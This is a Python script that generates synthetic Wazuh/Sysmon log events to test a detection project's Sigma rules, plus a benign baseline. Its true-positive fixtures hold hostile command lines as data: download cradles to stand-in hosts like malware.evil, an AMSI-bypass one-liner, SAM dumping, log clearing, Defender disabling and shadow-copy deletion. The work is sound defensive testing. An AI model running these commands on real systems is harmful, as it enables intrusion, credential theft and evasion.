#!/usr/bin/env python3
"""
seed_test_logs.py — PurpleForge Test Corpus Generator

Reads every Sigma rule in rules/**/*.yml, inspects detection criteria and
custom.tp_file path, and generates matching realistic Wazuh-formatted JSON
events in tests/tp/. Also generates tests/tn/benign_baseline.json containing
25+ benign events that specifically test filter_* exclusion clauses.
"""

import json
import os
import sys
import uuid
import yaml
import glob
from datetime import datetime, timezone

# Ensure UTF-8 output on Windows consoles
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass


PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
RULES_DIR = os.path.join(PROJECT_ROOT, "rules")
TESTS_TP_DIR = os.path.join(PROJECT_ROOT, "tests", "tp")
TESTS_TN_DIR = os.path.join(PROJECT_ROOT, "tests", "tn")

TIMESTAMP = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
COMPUTER = "WS01.corp.purpleforge.local"


def make_wazuh_event(event_id, channel, image="", command_line="",
                     parent_image="", parent_command_line="", user="CORP\\redteam",
                     target_filename="", target_object="", details="",
                     source_image="", target_image="", granted_access="",
                     ticket_encryption_type="", service_name="",
                     script_block_text="", query_name="", destination_port="",
                     share_name="", relative_target_name="", computer=COMPUTER):
    """Build a complete Wazuh-formatted JSON event document."""
    event = {
        "timestamp": TIMESTAMP,
        "rule": {"level": 0, "description": "Test event"},
        "agent": {"id": "001", "name": "WS01", "ip": "10.10.10.20"},
        "manager": {"name": "wazuh-manager"},
        "id": str(uuid.uuid4()),
        "data": {
            "win": {
                "system": {
                    "eventID": str(event_id),
                    "channel": channel,
                    "computer": computer,
                    "providerName": "Microsoft-Windows-Sysmon",
                    "systemTime": TIMESTAMP,
                    "eventRecordID": str(uuid.uuid4().int % 100000)
                },
                "eventdata": {}
            }
        }
    }
    ed = event["data"]["win"]["eventdata"]
    if image:
        ed["image"] = image
    if command_line:
        ed["commandLine"] = command_line
    if parent_image:
        ed["parentImage"] = parent_image
    if parent_command_line:
        ed["parentCommandLine"] = parent_command_line
    if user:
        ed["user"] = user
    if target_filename:
        ed["targetFilename"] = target_filename
    if target_object:
        ed["targetObject"] = target_object
    if details:
        ed["details"] = details
    if source_image:
        ed["sourceImage"] = source_image
    if target_image:
        ed["targetImage"] = target_image
    if granted_access:
        ed["grantedAccess"] = granted_access
    if ticket_encryption_type:
        ed["ticketEncryptionType"] = ticket_encryption_type
    if service_name:
        ed["serviceName"] = service_name
    if script_block_text:
        ed["scriptBlockText"] = script_block_text
    if query_name:
        ed["queryName"] = query_name
    if destination_port:
        ed["destinationPort"] = str(destination_port)
    if share_name:
        ed["shareName"] = share_name
    if relative_target_name:
        ed["relativeTargetName"] = relative_target_name
    return event


# ── True Positive event generators keyed by rule filename ──────────────
TP_GENERATORS = {
    "win_powershell_encoded_cmd.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -EncodedCommand SW52b2tlLUV4cHJlc3Npb24gKElFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2V2aWwuY29tL3NoZWxsJykp",
        parent_image="C:\\Windows\\explorer.exe",
        user="CORP\\redteam"
    ),
    "win_powershell_download_cradle.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"(New-Object Net.WebClient).DownloadString('http://malware.evil/payload.ps1')\"",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        user="CORP\\redteam"
    ),
    "win_cmd_whoami_recon.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\whoami.exe",
        command_line="whoami /all",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        parent_command_line="cmd.exe /c whoami /all",
        user="CORP\\redteam"
    ),
    "win_wmi_process_call_create.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\wbem\\wmic.exe",
        command_line="wmic /node:10.10.10.10 process call create \"cmd.exe /c whoami > C:\\Temp\\out.txt\"",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        user="CORP\\redteam"
    ),
    "win_registry_run_key_persistence.yml": lambda: make_wazuh_event(
        event_id=13, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Users\\redteam\\Desktop\\implant.exe",
        target_object="HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor",
        details="C:\\Users\\redteam\\AppData\\Roaming\\svchost_fake.exe",
        user="CORP\\redteam"
    ),
    "win_schtasks_suspicious_creation.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\schtasks.exe",
        command_line="schtasks /create /tn Updater /tr \"powershell.exe -enc aQBlAHgA\" /sc onlogon /ru SYSTEM",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        user="CORP\\redteam"
    ),
    "win_new_local_user_created.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\net.exe",
        command_line="net user backdoor P@ssw0rd123! /add",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        user="CORP\\redteam"
    ),
    "win_wmi_event_subscription.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\wbem\\wmic.exe",
        command_line="wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"PurpleFilter\", EventNameSpace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        user="CORP\\redteam"
    ),
    "win_uac_bypass_fodhelper.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\cmd.exe",
        command_line="cmd.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1",
        parent_image="C:\\Windows\\System32\\fodhelper.exe",
        user="CORP\\redteam"
    ),
    "win_token_impersonation_privs.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Users\\redteam\\Tools\\PrintSpoofer.exe",
        command_line="PrintSpoofer.exe -i -c cmd",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        user="CORP\\redteam"
    ),
    "win_service_binary_path_change.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\sc.exe",
        command_line="sc config VulnService binpath= \"cmd.exe /c C:\\Temp\\payload.exe\"",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        user="CORP\\redteam"
    ),
    "win_lsass_memory_dump.yml": lambda: make_wazuh_event(
        event_id=10, channel="Microsoft-Windows-Sysmon/Operational",
        source_image="C:\\Users\\redteam\\Tools\\mimikatz.exe",
        target_image="C:\\Windows\\System32\\lsass.exe",
        granted_access="0x1fffff",
        user="CORP\\redteam"
    ),
    "win_reg_save_sam_system_hives.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\reg.exe",
        command_line="reg save hklm\\sam C:\\Temp\\sam.hiv",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        user="CORP\\redteam"
    ),
    "win_ntds_dit_extraction_vss.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\vssadmin.exe",
        command_line="vssadmin create shadow /for=C:",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        user="CORP\\redteam",
        computer="DC01.corp.purpleforge.local"
    ),
    "win_kerberoasting_rc4_ticket.yml": lambda: make_wazuh_event(
        event_id=4769, channel="Security",
        user="CORP\\redteam",
        ticket_encryption_type="0x17",
        service_name="MSSQLSvc/sql01.corp.purpleforge.local:1433",
        computer="DC01.corp.purpleforge.local"
    ),
    "win_asrep_roasting_preauth.yml": lambda: make_wazuh_event(
        event_id=4768, channel="Security",
        user="svc_backup",
        ticket_encryption_type="0x17",
        computer="DC01.corp.purpleforge.local"
    ),
    "win_smb_psexec_service_install.yml": lambda: make_wazuh_event(
        event_id=7045, channel="System",
        service_name="PSEXESVC",
        image="C:\\Windows\\PSEXESVC.exe",
        user="CORP\\redteam"
    ),
    "win_admin_share_executable_drop.yml": lambda: make_wazuh_event(
        event_id=11, channel="Microsoft-Windows-Sysmon/Operational",
        target_filename="C:\\Windows\\PSEXESVC.exe",
        share_name="ADMIN$",
        image="C:\\Windows\\System32\\svchost.exe",
        user="CORP\\redteam"
    ),
    "win_winrm_remote_powershell_spawn.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\cmd.exe",
        command_line="cmd.exe /c whoami && ipconfig",
        parent_image="C:\\Windows\\System32\\wsmprovhost.exe",
        user="CORP\\redteam"
    ),
    "win_rdp_loopback_tunnel.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\netsh.exe",
        command_line="netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=127.0.0.1",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        user="CORP\\redteam"
    ),
    "win_security_eventlog_cleared.yml": lambda: make_wazuh_event(
        event_id=1102, channel="Security",
        user="CORP\\redteam"
    ),
    "win_wevtutil_log_clear.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\wevtutil.exe",
        command_line="wevtutil cl Security",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        user="CORP\\redteam"
    ),
    "win_defender_realtime_disabled.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        user="CORP\\redteam"
    ),
    "win_amsi_bypass_reflection.yml": lambda: make_wazuh_event(
        event_id=4104, channel="Microsoft-Windows-PowerShell/Operational",
        script_block_text="[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        user="CORP\\redteam"
    ),
    "win_rundll32_suspicious_proxy.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -ep bypass -e aQBlAHgA\")",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        user="CORP\\redteam"
    ),
    "win_dns_tunneling_high_entropy.yml": lambda: make_wazuh_event(
        event_id=22, channel="Microsoft-Windows-Sysmon/Operational",
        query_name="aHR0cDovL2V2aWwuY29tL2RhdGEK.c2.evil-dns-tunnel.dnscat.example.com",
        image="C:\\Users\\redteam\\Tools\\dnscat2.exe",
        user="CORP\\redteam"
    ),
    "win_certutil_urlcache_download.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\certutil.exe",
        command_line="certutil.exe -urlcache -f http://malware.evil/beacon.exe C:\\Temp\\beacon.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        user="CORP\\redteam"
    ),
    "win_non_browser_uncommon_port.yml": lambda: make_wazuh_event(
        event_id=3, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Users\\redteam\\Tools\\beacon.exe",
        destination_port=4444,
        user="CORP\\redteam"
    ),
    "win_vssadmin_shadowcopy_delete.yml": lambda: make_wazuh_event(
        event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
        image="C:\\Windows\\System32\\vssadmin.exe",
        command_line="vssadmin.exe delete shadows /all /quiet",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        user="CORP\\redteam"
    ),
    "win_ransomware_mass_file_rename.yml": lambda: make_wazuh_event(
        event_id=11, channel="Microsoft-Windows-Sysmon/Operational",
        target_filename="C:\\Users\\Public\\Documents\\Finance_Share\\Q4_Report.docx.purplelocked",
        image="C:\\Users\\redteam\\Tools\\ransomware_sim.exe",
        user="CORP\\redteam"
    ),
}


def generate_benign_baseline():
    """Generate 25+ realistic benign Windows events that test filter_* clauses."""
    benign_events = [
        # Benign 1: OneDriveSetup adding Run key (filter_onedrive_setup)
        make_wazuh_event(
            event_id=13, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Users\\admin\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveSetup.exe",
            target_object="HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive",
            details="C:\\Users\\admin\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe /background",
            user="CORP\\admin"
        ),
        # Benign 2: svchost.exe accessing lsass.exe with 0x1410 (filter_normal_access)
        make_wazuh_event(
            event_id=10, channel="Microsoft-Windows-Sysmon/Operational",
            source_image="C:\\Windows\\System32\\svchost.exe",
            target_image="C:\\Windows\\System32\\lsass.exe",
            granted_access="0x1410",
            user="NT AUTHORITY\\SYSTEM"
        ),
        # Benign 3: Machine account Kerberos ticket (filter_machine_accounts)
        make_wazuh_event(
            event_id=4769, channel="Security",
            user="WS01$",
            ticket_encryption_type="0x17",
            service_name="krbtgt",
            computer="DC01.corp.purpleforge.local"
        ),
        # Benign 4: Chrome browsing on port 8443 (filter_browsers)
        make_wazuh_event(
            event_id=3, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            destination_port=8443,
            user="CORP\\admin"
        ),
        # Benign 5: SCCM running encoded PowerShell (filter_sccm)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line="powershell.exe -EncodedCommand cwBjAGMALQBjAGwAaQBlAG4AdAA=",
            parent_image="C:\\Windows\\CCM\\ccmexec.exe",
            user="NT AUTHORITY\\SYSTEM"
        ),
        # Benign 6: Normal PowerShell admin command without download cradle
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line="powershell.exe Get-Process | Sort-Object CPU -Descending",
            parent_image="C:\\Windows\\explorer.exe",
            user="CORP\\admin"
        ),
        # Benign 7: Windows Update scheduled task (filter_windows_update)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\schtasks.exe",
            command_line="schtasks /create /tn \"\\Microsoft\\Windows\\UpdateOrchestrator\\Reboot\" /tr reboot /sc once",
            parent_image="C:\\Windows\\System32\\svchost.exe",
            user="NT AUTHORITY\\SYSTEM"
        ),
        # Benign 8: Domain join machine account creation (filter_domain_join)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\net.exe",
            command_line="net user WS02$ /add",
            parent_image="C:\\Windows\\System32\\djoin.exe",
            user="NT AUTHORITY\\SYSTEM"
        ),
        # Benign 9: SCOM monitoring WMI query (filter_scom_monitoring)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\wbem\\wmic.exe",
            command_line="wmic process call create \"powershell -c Get-Service\"",
            parent_image="C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\MonitoringHost.exe",
            user="NT AUTHORITY\\SYSTEM"
        ),
        # Benign 10: Defender scanning process (filter_defender_scan)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2301.6-0\\MsMpEng.exe",
            command_line="MsMpEng.exe",
            parent_image="C:\\Windows\\System32\\services.exe",
            user="NT AUTHORITY\\SYSTEM"
        ),
        # Benign 11: Legitimate mstsc.exe RDP connection (filter_legitimate_rdp_gateway)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\mstsc.exe",
            command_line="mstsc.exe /v:10.10.10.10",
            parent_image="C:\\Windows\\explorer.exe",
            user="CORP\\admin"
        ),
        # Benign 12: SYSTEM wevtutil scheduled log rotation (filter_log_rotation_scheduled)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\wevtutil.exe",
            command_line="wevtutil cl Application",
            parent_image="C:\\Windows\\System32\\schtasks.exe",
            user="NT AUTHORITY\\SYSTEM"
        ),
        # Benign 13: GPO applying Defender settings (filter_gpo_application)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line="powershell.exe Set-MpPreference -DisableRealtimeMonitoring $false",
            parent_image="C:\\Windows\\System32\\gpscript.exe",
            user="NT AUTHORITY\\SYSTEM"
        ),
        # Benign 14: Defender testing AMSI (filter_defender_definitions)
        make_wazuh_event(
            event_id=4104, channel="Microsoft-Windows-PowerShell/Operational",
            script_block_text="Test-AMSIDetection -Path 'C:\\test.ps1' | Get-MpPreference",
            user="NT AUTHORITY\\SYSTEM"
        ),
        # Benign 15: Normal shell32 rundll32 Control Panel (filter_shell32_normal)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\rundll32.exe",
            command_line="rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
            parent_image="C:\\Windows\\explorer.exe",
            user="CORP\\admin"
        ),
        # Benign 16: Microsoft CDN DNS query with long subdomain (filter_legitimate_cdn)
        make_wazuh_event(
            event_id=22, channel="Microsoft-Windows-Sysmon/Operational",
            query_name="a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0.update.microsoft.com",
            image="C:\\Windows\\System32\\svchost.exe",
            user="NT AUTHORITY\\NETWORK SERVICE"
        ),
        # Benign 17: Certificate enrollment via certutil (filter_certificate_enrollment)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\certutil.exe",
            command_line="certutil.exe -urlcache -f -addstore Root C:\\certs\\company_root.cer",
            parent_image="C:\\Windows\\System32\\svchost.exe",
            user="NT AUTHORITY\\SYSTEM"
        ),
        # Benign 18: Node.js dev server on port 8080 (filter_development_tools)
        make_wazuh_event(
            event_id=3, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Program Files\\nodejs\\node.exe",
            destination_port=8080,
            user="CORP\\developer"
        ),
        # Benign 19: Veeam managing shadow copies (filter_backup_software)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\vssadmin.exe",
            command_line="vssadmin.exe delete shadows /for=E: /all /quiet",
            parent_image="C:\\Program Files\\Veeam\\Backup and Replication\\veeam.backup.shell.exe",
            user="NT AUTHORITY\\SYSTEM"
        ),
        # Benign 20: 7-Zip creating encrypted archive (filter_legitimate_encryption)
        make_wazuh_event(
            event_id=11, channel="Microsoft-Windows-Sysmon/Operational",
            target_filename="C:\\Users\\admin\\Documents\\archive.7z.encrypted",
            image="C:\\Program Files\\7-Zip\\7z.exe",
            user="CORP\\admin"
        ),
        # Benign 21: MSI installer updating service path (filter_msi_installer)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\sc.exe",
            command_line="sc config MyApp binpath= \"C:\\Program Files\\MyApp\\svc.exe\"",
            parent_image="C:\\Windows\\System32\\msiexec.exe",
            user="NT AUTHORITY\\SYSTEM"
        ),
        # Benign 22: SystemSettings launched from fodhelper (filter_legitimate_settings)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\ImmersiveControlPanel\\SystemSettings.exe",
            command_line="SystemSettings.exe",
            parent_image="C:\\Windows\\System32\\fodhelper.exe",
            user="CORP\\admin"
        ),
        # Benign 23: Chocolatey PowerShell download (filter_chocolatey)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line="powershell.exe -Command \"(New-Object Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')\"",
            parent_image="C:\\Windows\\System32\\cmd.exe",
            user="CORP\\admin"
        ),
        # Benign 24: SCCM provisioning creating local account (filter_sccm_provisioning)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\net.exe",
            command_line="net user sccmadmin P@ssword /add",
            parent_image="C:\\Windows\\ccmsetup\\ccmsetup.exe",
            user="NT AUTHORITY\\SYSTEM"
        ),
        # Benign 25: PDQ Deploy administrative service (filter_legitimate_admin_tools)
        make_wazuh_event(
            event_id=7045, channel="System",
            service_name="PDQDeployRunner-1",
            image="C:\\Windows\\Temp\\PDQDeployRunner\\PDQDeployRunner-1.exe",
            user="NT AUTHORITY\\SYSTEM"
        ),
        # Benign 26: Edge browser on port 8443 (filter_browsers)
        make_wazuh_event(
            event_id=3, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
            destination_port=8443,
            user="CORP\\admin"
        ),
        # Benign 27: OCSP DNS query (filter_ocsp_crl)
        make_wazuh_event(
            event_id=22, channel="Microsoft-Windows-Sysmon/Operational",
            query_name="ocsp.digicert.com",
            image="C:\\Windows\\System32\\svchost.exe",
            user="NT AUTHORITY\\NETWORK SERVICE"
        ),
        # Benign 28: Exchange WinRM management (filter_exchange_management)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line="powershell.exe Get-Mailbox -ResultSize Unlimited",
            parent_image="C:\\Windows\\System32\\wsmprovhost.exe",
            user="CORP\\exchangeadmin"
        ),
        # Benign 29: ConfigMgr WMI operations (filter_configmgr)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line="powershell.exe Set-WmiInstance -Namespace root\\ccm -Class ConfigMgr_EventConsumer",
            parent_image="C:\\Windows\\System32\\svchost.exe",
            user="NT AUTHORITY\\SYSTEM"
        ),
        # Benign 30: Intune management setting Defender preferences (filter_intune_management)
        make_wazuh_event(
            event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line="powershell.exe Set-MpPreference -DisableRealtimeMonitoring $false",
            parent_image="C:\\Program Files (x86)\\Microsoft Intune Management Extension\\IntuneManagementExtension.exe",
            user="NT AUTHORITY\\SYSTEM"
        ),
    ]
    return benign_events


def discover_rules():
    """Find all Sigma rule YAML files under rules/, excluding yara-l/."""
    pattern = os.path.join(RULES_DIR, "**", "*.yml")
    rules = []
    for path in glob.glob(pattern, recursive=True):
        normalized = path.replace("\\", "/")
        if "yara-l" not in normalized:
            rules.append(path)
    return sorted(rules)


def load_rule(path):
    """Load and parse a Sigma rule YAML file."""
    with open(path, "r", encoding="utf-8") as f:
        return yaml.safe_load(f)


def main():
    print("=" * 70)
    print("PurpleForge — Test Corpus Generator (seed_test_logs.py)")
    print("=" * 70)

    # Ensure output directories exist
    os.makedirs(TESTS_TP_DIR, exist_ok=True)
    os.makedirs(TESTS_TN_DIR, exist_ok=True)

    rules = discover_rules()
    print(f"\n[*] Discovered {len(rules)} Sigma rules")

    tp_generated = 0
    tp_errors = []

    for rule_path in rules:
        rule_filename = os.path.basename(rule_path)
        try:
            rule_data = load_rule(rule_path)
        except Exception as e:
            tp_errors.append((rule_filename, f"YAML parse error: {e}"))
            continue

        # Determine TP output path
        custom = rule_data.get("custom", {})
        tp_file = custom.get("tp_file", "")
        if tp_file:
            tp_output_path = os.path.join(PROJECT_ROOT, tp_file.replace("/", os.sep))
        else:
            # Fallback: generate from rule filename
            tp_output_path = os.path.join(TESTS_TP_DIR, rule_filename.replace(".yml", ".json"))

        # Generate TP event
        if rule_filename in TP_GENERATORS:
            event = TP_GENERATORS[rule_filename]()
            os.makedirs(os.path.dirname(tp_output_path), exist_ok=True)
            with open(tp_output_path, "w", encoding="utf-8") as f:
                json.dump(event, f, indent=2, ensure_ascii=False)
            tp_generated += 1
            print(f"  [+] TP: {os.path.relpath(tp_output_path, PROJECT_ROOT)}")
        else:
            tp_errors.append((rule_filename, "No TP generator defined"))

    # Generate True Negative baseline
    print(f"\n[*] Generating benign baseline (True Negative corpus)...")
    benign_events = generate_benign_baseline()
    tn_output_path = os.path.join(TESTS_TN_DIR, "benign_baseline.json")
    with open(tn_output_path, "w", encoding="utf-8") as f:
        json.dump(benign_events, f, indent=2, ensure_ascii=False)
    print(f"  [+] TN: {os.path.relpath(tn_output_path, PROJECT_ROOT)} ({len(benign_events)} events)")

    # Summary
    print(f"\n{'=' * 70}")
    print(f"Summary:")
    print(f"  Rules discovered:     {len(rules)}")
    print(f"  TP logs generated:    {tp_generated}")
    print(f"  TN events generated:  {len(benign_events)}")
    if tp_errors:
        print(f"  Errors/Warnings:      {len(tp_errors)}")
        for filename, error in tp_errors:
            print(f"    [-] {filename}: {error}")
    print(f"{'=' * 70}")

    if tp_generated == 0:
        print("\n[!] ERROR: No TP logs were generated!")
        sys.exit(1)

    print("\n[✓] Test corpus generation complete.")
    sys.exit(0)


if __name__ == "__main__":
    main()
